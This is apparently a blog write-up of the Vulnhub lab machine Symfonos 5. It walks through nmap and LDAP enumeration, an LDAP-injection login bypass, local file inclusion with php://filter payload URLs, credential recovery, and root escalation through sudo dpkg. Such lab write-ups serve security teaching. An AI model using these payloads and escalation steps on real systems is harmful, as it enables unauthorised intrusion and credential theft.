---
layout: default
title : muzec - Symfonos 5 Vulnhub Writeup
---

![image](https://user-images.githubusercontent.com/69868171/157661820-a7611ce1-577c-464e-af09-7ca77bed1877.png)

Now back to the series of `symfonos` seems we are almost done let jump back to it has always.



We always start with an nmap scan.....


```
nmap -p- -sC -sV -oN nmap/full.tcp 172.16.109.166
```

```
# Nmap 7.91 scan initiated Thu Mar 10 08:01:18 2022 as: nmap -p- -sC -sV -oN nmap/full.tcp 172.16.109.166
Nmap scan report for 172.16.109.166
Host is up (0.012s latency).
Not shown: 65531 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 16:70:13:77:22:f9:68:78:40:0d:21:76:c1:50:54:23 (RSA)
|   256 a8:06:23:d0:93:18:7d:7a:6b:05:77:8d:8b:c9:ec:02 (ECDSA)
|_  256 52:c0:83:18:f4:c7:38:65:5a:ce:97:66:f3:75:68:4c (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
636/tcp open  ldapssl?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar 10 08:01:34 2022 -- 1 IP address (1 host up) scanned in 15.98 seconds

```

Interesting we just have 4 open ports which seems cool let start with low hanging fruit first which is `ldap` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos5]
└─$ ldapsearch -x -h 172.16.109.166  -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: dc=symfonos,dc=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Interesting now that we have the `namingcontexts` let move forward.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos5]
└─$ ldapsearch -x -h 172.16.109.166  -b "dc=symfonos,dc=local"
# extended LDIF
#
# LDAPv3
# base <dc=symfonos,dc=local> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 32 No such object

# numResponses: 1
```

Now that is a deadend seems we need a credentials to access the ldap without wasting to much of time let move forward.

### 80 HTTP


![image](https://user-images.githubusercontent.com/69868171/157663764-8c552584-9201-43ea-8ce7-f81a35de6005.png)

Just a plain page with zeus background checking the source but got nothing time to Fuzz it.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos5]
└─$ ffuf -ic -c -u http://172.16.109.166/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e .php,.html,.txt -o ffuf.dirb
```

![image](https://user-images.githubusercontent.com/69868171/157666237-20dbc841-93b5-4e66-8e43-8eee63837d8f.png)

Now that `admin.php` look promising let check what we have on it.

![image](https://user-images.githubusercontent.com/69868171/157667183-23c2be3f-69d7-4587-9e21-e0f7061a92f0.png)

Now that is a login page try some credentials like `admin/password` and sql injection also but no luck but still one seems we have ldap why not try ldap injection also.

![image](https://user-images.githubusercontent.com/69868171/157667981-e1dfe991-37bb-4f10-aab8-77968ca3b583.png)

### Ldap Injection

The payload am using is `*` for username and `*` for password.

![image](https://user-images.githubusercontent.com/69868171/157668343-0028d1de-65ee-44e6-bf54-beb12e2487ae.png)

Boom we are in time to look around to see what we can get.

![image](https://user-images.githubusercontent.com/69868171/157668409-54193ea1-7777-441c-8a5f-7299e81c6492.png)

Possible RFI/LFI hehehehe let try RFI first.

![image](https://user-images.githubusercontent.com/69868171/157668683-df13fcc6-328b-4b0f-9aee-22ad02bcdac4.png)

Now that is strange we are just getting part of the shell.php file back but we are getting the file it was confirm below.

![image](https://user-images.githubusercontent.com/69868171/157668959-8c1baf58-9caa-4d3c-9f78-b620415671bd.png)

Now back to `LFI` exploiting.

![image](https://user-images.githubusercontent.com/69868171/157669698-a221f020-76ef-43b3-a5e6-41ee30475ab7.png)

Now we are talking so far i try `ssh log poisoning, pache log poisoning` we have no luck now try reading the page source with the `php wrapper` payload.

```
http://172.16.109.166/home.php?url=php://filter/convert.base64-encode/resource=home.php
```

![image](https://user-images.githubusercontent.com/69868171/157670829-d6cc91cb-0933-4d75-81a8-450ca4bf69c7.png)


Now let decode the `base64`  and see the source code.

![image](https://user-images.githubusercontent.com/69868171/157671185-4607d6f1-ae60-43d2-94d9-7955d4ea11a8.png)

Nah... nothing let check the `admin.php` now.

```
http://172.16.109.166/home.php?url=php://filter/convert.base64-encode/resource=admin.php
```

![image](https://user-images.githubusercontent.com/69868171/157671330-17c5052c-714a-4348-a49f-1905b6a62f7a.png)


![image](https://user-images.githubusercontent.com/69868171/157671511-e152f056-d7fd-4577-be47-8f9a649db501.png)

Now we have credentials for `ldap` back to it.

```
ldapsearch -h 172.16.109.166 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -s base namingcontexts
```

![image](https://user-images.githubusercontent.com/69868171/157671701-c0429379-1766-4373-bf4d-15ebaa319bdc.png)


```
ldapsearch -h 172.16.109.166 -D 'cn=admin,dc=symfonos,dc=local' -w 'qMDdyZh3cT6eeAWD' -b "dc=symfonos,dc=local"
```

![image](https://user-images.githubusercontent.com/69868171/157671928-a58e0199-9e68-4de8-a018-6a17a310c68e.png)

Now seems we find a way encoded in base64 let decode it.

![image](https://user-images.githubusercontent.com/69868171/157672149-05f68008-f1f6-4529-911d-f14e8ab18ae2.png)

Now try it on `SSH` with the user `zeus` .

![image](https://user-images.githubusercontent.com/69868171/157672314-c111598a-9dd9-4c96-b4fc-b82e840b2db2.png)

Boom we are in and seems we can run `sudo` with `/usr/bin/dpkg` now let jump to `gtfobins` .

![image](https://user-images.githubusercontent.com/69868171/157672515-7a302705-dde1-41c1-a874-4f3228b70aef.png)


```
sudo /usr/bin/dpkg -l
```

![image](https://user-images.githubusercontent.com/69868171/157672978-5847aed2-5d28-48bd-a46a-ae2bba94e181.png)

Now let type `!sh` to drop into root shell.

![image](https://user-images.githubusercontent.com/69868171/157673116-d044a9a7-4a3c-4aa1-b8c6-3d91a2853259.png)

![image](https://user-images.githubusercontent.com/69868171/157673179-eea273bd-510c-4c97-a5d5-9edc652e40e9.png)

We are done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
